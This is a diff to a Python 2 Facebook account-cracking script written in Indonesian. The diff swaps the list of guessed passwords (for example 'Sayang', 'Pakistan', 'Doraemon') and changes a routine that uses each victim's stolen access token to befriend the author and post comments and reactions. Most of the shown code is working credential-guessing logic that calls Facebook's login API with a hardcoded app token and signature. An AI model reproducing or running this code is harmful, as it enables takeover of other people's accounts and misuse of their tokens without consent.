@@ -211,11 +211,11 @@ def bot_komen():
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('100005789553399')
-	kom = ('Hello Aa WAHYU GW pke SC lu')
+	kom = ('GUE PAKE SCRIPT LU BANG WAHYU 😘😘😘')
 	reac = ('ANGRY')
 	post = ('1190012567868384')
 	post2 = ('1190012567868384')
-	kom2 = ('Keren')
+	kom2 = ('KREN SUKSES SELALU YA 😘😘😘')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
@@ -273,7 +273,7 @@ def menu():
 	
 ######PILIH######
 def pilih():
-	unikers = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
+	unikers = raw_input("\033[1;93mWAHYU \033[91m:\033[1;96m ")
 	if unikers =="":
 		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
 		pilih()
@@ -311,7 +311,7 @@ def indo():
 
 #### PILIH INDO ####
 def pilih_indo():
-	teak = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
+	teak = raw_input("\033[1;93mWAHYU \033[91m:\033[1;96m ")
 	if teak =="":
 		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
 		pilih_indo()
@@ -529,7 +529,7 @@ def pilih_indo():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'Facebook123'
+															pass7 = 'Sayang'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															w = json.load(data)
 															if 'access_token' in w:
@@ -553,7 +553,7 @@ def pilih_indo():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = 'Facebook1234'
+																	pass8 = 'Sayang123'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	w = json.load(data)
 																	if 'access_token' in w:
@@ -577,7 +577,7 @@ def pilih_indo():
 																			cek.close()
 																			cekpoint.append(user+pass8)
 																		else:
-																				pass9 = 'Facebook12345'
+																				pass9 = 'Sayang1234'
 																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																				w = json.load(data)
 																				if 'access_token' in w:
@@ -601,7 +601,7 @@ def pilih_indo():
 																						cek.close()
 																						cekpoint.append(user+pass9)
 																					else:
-																						pass10 = '123456789'
+																						pass10 = 'Pakistan'
 																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																						w = json.load(data)
 																						if 'access_token' in w:
@@ -625,7 +625,7 @@ def pilih_indo():
 																								cek.close()
 																								cekpoint.append(user+pass10)
 																							else:
-																								pass11 = '123456'
+																								pass11 = 'Doraemon'
 																								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																								w = json.load(data)
 																								if 'access_token' in w:
